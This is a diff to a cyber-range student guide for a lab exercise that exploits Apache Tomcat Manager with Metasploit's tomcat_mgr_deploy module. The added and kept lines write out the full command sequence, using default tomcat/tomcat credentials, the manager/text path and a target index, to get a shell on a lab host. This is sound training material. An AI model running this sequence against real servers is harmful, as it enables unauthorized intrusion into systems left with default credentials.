@@ -138,34 +138,36 @@ What you can do with this Version strings are gold. Search them in **Exploit-DB*
 
 #### Step 1 — launch Metasploit
 ```bash
-msfconsole -q   # -q = quiet, skips the banner
+msfconsole -q
 ```
 
 #### Step 2 — configure and run the exploit (inside msfconsole)
 
-> **Required — do not skip `set PATH`:** Debian's Tomcat serves Manager at `/manager/text`. If you omit `set PATH /manager/text`, the exploit hits the wrong URL and **fails** (you will not get a shell). Confirm that line appears in your Metasploit history before Manual Check.
+> **Required lines:** `set PATH /manager/text` and `set TARGET 1`. Without PATH, Manager is hit at the wrong URL. Without TARGET, Metasploit may pick a payload that does not get a shell on this lab. Both must appear in your history before Manual Check.
 
-Type these one at a time (or Copy each line without the `msf6 >` prompt):
+Copy/paste these **one line at a time** (inside `msfconsole`):
 
 ```bash
-search tomcat_mgr_deploy
 use exploit/multi/http/tomcat_mgr_deploy
 set RHOSTS $TARGET_META
 set RPORT 8180
 set HttpUsername tomcat
 set HttpPassword tomcat
 set PATH /manager/text
+set TARGET 1
 run
 ```
 
+`$TARGET_META` is your Meta IP (same as the lab header; for pod 1 it is often `10.0.51.20`). If the variable is empty, paste the Meta IP from the header instead.
+
 Command | What it does  
 --- | ---  
-`search …` | find the exploit module by name  
-`use …` | select that module to work with  
-`set RHOSTS` | **R** emote **host** — the target's IP (Meta); `$TARGET_META` expands in Kali  
+`use …` | select the Tomcat Manager deploy exploit  
+`set RHOSTS` | **R** emote **host** — Meta (`$TARGET_META`)  
 `set RPORT 8180` | **R** emote **port** — where Tomcat listens  
-`set HttpUsername / HttpPassword` | the Manager login — defaults `tomcat` / `tomcat`  
+`set HttpUsername / HttpPassword` | Manager login — defaults `tomcat` / `tomcat`  
 `set PATH /manager/text` | **required** Manager API path on this Debian Tomcat  
+`set TARGET 1` | **required** payload target index that works on this lab  
 `run` | fire the exploit  
 
 #### Step 3 — confirm you're in (inside the new session)
@@ -189,7 +191,7 @@ exit
 
 > **Why exit matters:** Manual Check reads your **Metasploit history**. That history is not fully written until the session/console activity is flushed — so this milestone can stay FAIL until you actually run `exit`. If it still fails after a working shell, run one more msf command or close `msfconsole` cleanly, then re-check.
 
-**Done when:** your shell showed a `tomcat` context (e.g. `uid=1001(tomcat) …`), your history includes `set PATH /manager/text`, and you have run `exit`.
+**Done when:** your shell showed a `tomcat` context (e.g. `uid=1001(tomcat) …`), your history includes `set PATH /manager/text` and `set TARGET 1`, and you have run `exit`.
 
 **Then:** **Manual Check** on _Tomcat Manager Exploitation_.
 
@@ -218,6 +220,6 @@ Symptom | Fix
 --- | ---  
 Manual Check FAIL after nmap | Press **Enter** , wait ~1s, check again. Make sure you're in the Kali tab.  
 No route / host down | Confirm the pod is **ACTIVE** ; use the exact IPs from your lab header.  
-Tomcat exploit fails / no shell | Re-check history for **`set PATH /manager/text`** (most common miss), plus `RPORT 8180` and creds `tomcat`/`tomcat`.  
+Tomcat exploit fails / no shell | Re-check history for **`set PATH /manager/text`** and **`set TARGET 1`**, plus `RPORT 8180` and creds `tomcat`/`tomcat`. Use `$TARGET_META` (or the Meta IP from the lab header).  
 Wrong tab | Tasks 1–4 all run from **Kali** , never the Meta tab.  
 MMDC Cyber Range · Scenario 1 student guide · for use only inside your assigned lab pod.
